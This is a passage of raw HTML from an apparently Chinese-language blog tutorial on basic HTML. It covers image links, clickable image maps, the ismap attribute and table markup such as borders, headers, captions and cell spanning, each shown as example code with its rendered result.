class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="50" height="50"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="100" height="100"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg" width="200" height="200"><h3 id="图像链接"><a href="#图像链接" class="headerlink" title="图像链接"></a>图像链接</h3><p>将一个图像当作链接使用。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>比如点一点这个就到达我的博客主页了→ <a href="https://miaotony.xyz"><img src="/2020/02/14/FrontEnd_HTML_Basic/html5.jpg"></a></p><p><em>（有可能被hexo优化掉emmm</em></p><h3 id="创建图像映射"><a href="#创建图像映射" class="headerlink" title="创建图像映射"></a>创建图像映射</h3><p>创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。</p><p><code>img</code> 元素中的 “usemap” 属性引用 <code>map</code> 元素中的 “id” 或 “name” 属性（根据浏览器）</p><p>图片左上角坐标为 (0,0)，右下角为 (x,y)，左往右为x轴正方向，上往下为y轴正方向。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.w3school.com.cn/i/eg_planets.jpg<span class="token punctuation">"</span></span><span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">usemap</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#planetmap<span class="token punctuation">"</span></span><span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Planets<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>planetmap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;areashape="circle"coords="180,139,14"href ="https://www.w3school.com.cn/example/html/venus.html"target ="_blank"alt="Venus" />&lt;areashape="circle"coords="129,161,10"href ="https://www.w3school.com.cn/example/html/mercur.html"target ="_blank"alt="Mercury" />&lt;areashape="rect"coords="0,0,110,260"href ="https://www.w3school.com.cn/example/html/sun.html"target ="_blank"alt="Sun" /><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span></code></pre><p>其中<code>&lt;map&gt;</code>用来定义图像地图，<code>&lt;area&gt;</code>用来定义图像地图中的可点击区域。</p><p>点击对应的区域会跳转到不同的页面。<em><del>（链接有可能被hexo优化掉emmm</del></em>还是可以点的</p><p><img src="https://www.w3school.com.cn/i/eg_planets.jpg" border="0" usemap="#planetmap" alt="Planets"></p><map name="planetmap" id="planetmap"><area shape="circle" coords="180,139,14" href="https://www.w3school.com.cn/example/html/venus.html" target="_blank" alt="Venus"><area shape="circle" coords="129,161,10" href="https://www.w3school.com.cn/example/html/mercur.html" target="_blank" alt="Mercury"><area shape="rect" coords="0,0,110,260" href="https://www.w3school.com.cn/example/html/sun.html" target="_blank" alt="Sun"></map><h3 id="将图像转换为图像映射"><a href="#将图像转换为图像映射" class="headerlink" title="将图像转换为图像映射"></a>将图像转换为图像映射</h3><p>把一幅普通的图像设置为图像映射。加入<code>ismap</code> 属性，即可获得图片的坐标。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html_ismap.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/planets.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">ismap</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p>如果点击 (12,34)，则会访问<code>/html_ismap.html?12,34</code>.</p><br><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p>每个表格由 <code>table</code> 标签开始。每个表格行由 <code>tr</code> 标签 (table row) 开始。每个表格数据由 <code>td</code> 标签 (table data) 开始，即数据单元格的内容。</p><p>数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。</p><p><em>（这里在博客上可能很多显示不正常，因为另外有CSS样式对全局表格进行了定义</em></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table>    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="边框"><a href="#边框" class="headerlink" title="边框"></a>边框</h3><p>border属性</p><p>上面的例子没有边框，或者设置<code>&lt;table border="0"&gt;</code>。</p><p>带有普通的边框：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>First<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Second<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Row<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><p>粗的边框（增大<code>border</code>）：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><table border="10">    <tbody><tr>        <td>First</td>        <td>Row</td>    </tr>       <tr>        <td>Second</td>        <td>Row</td>    </tr></tbody></table><h3 id="表头"><a href="#表头" class="headerlink" title="表头"></a>表头</h3><p><code>th</code>标签</p><p>大多数浏览器会把表头显示为粗体居中的文本</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>Another Heading<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <th>Heading</th>        <th>Another Heading</th>    </tr>    <tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>row 2, cell 1</td>        <td>row 2, cell 2</td>    </tr></tbody></table><p>下面是垂直的表头：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <th>姓名</th>        <td>Miao</td>    </tr>    <tr>        <th>电话</th>        <td>123456</td>    </tr>    <tr>        <th>电话</th>        <td>654321</td>    </tr></tbody></table><h3 id="空单元格"><a href="#空单元格" class="headerlink" title="空单元格"></a>空单元格</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr><td>row 1, cell 1</td><td>row 1, cell 2</td></tr><tr><td></td><td>row 2, cell 2</td></tr></tbody></table><p>这个空的单元格的边框可能没有被显示出来。为了避免这种情况，在空单元格中添加一个空格占位符（<code>&amp;nbsp;</code>)，就可以将边框显示出来。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 1, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>row 2, cell 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1">    <tbody><tr>        <td>row 1, cell 1</td>        <td>row 1, cell 2</td>    </tr>    <tr>        <td>&nbsp;</td>        <td>row 2, cell 2</td>    </tr></tbody></table><h3 id="表的标题"><a href="#表的标题" class="headerlink" title="表的标题"></a>表的标题</h3><p><code>caption</code>标签</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">></span></span>这是标题<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>200<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>300<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>400<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>500<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>600<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="6">    <caption>这是标题</caption>    <tbody><tr>        <td>100</td>        <td>200</td>        <td>300</td>    </tr>    <tr>        <td>400</td>        <td>500</td>        <td>600</td>    </tr></tbody></table><h3 id="单元格跨行跨列"><a href="#单元格跨行跨列" class="headerlink" title="单元格跨行跨列"></a>单元格跨行跨列</h3><p><strong>横跨列：</strong><code>colspan</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <th>姓名</th>  <th colspan="2">电话</th></tr><tr>  <td>Miao</td>  <td>123456</td>  <td>654321</td></tr></tbody></table><p><strong>横跨行：</strong><code>rowspan</code>属性</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Miao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">rowspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>电话<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>654321<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></code></pre><table border="1"><tbody><tr>  <th>姓名</th>  <td>Miao</td></tr><tr>  <th rowspan="2">电话</th>  <td>123456</td></tr><tr>  <td>654321</td></tr></tbody></table><h3 id="表格内标签"><a href="#表格内标签" class="headerlink" title="表格内标签"></a>表格内标签</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是一个段落。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>这是另一个段落。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>这个单元包含一个表格：   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>B<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>C<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>D<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>这个单元包含一个列表：   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>苹果<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span 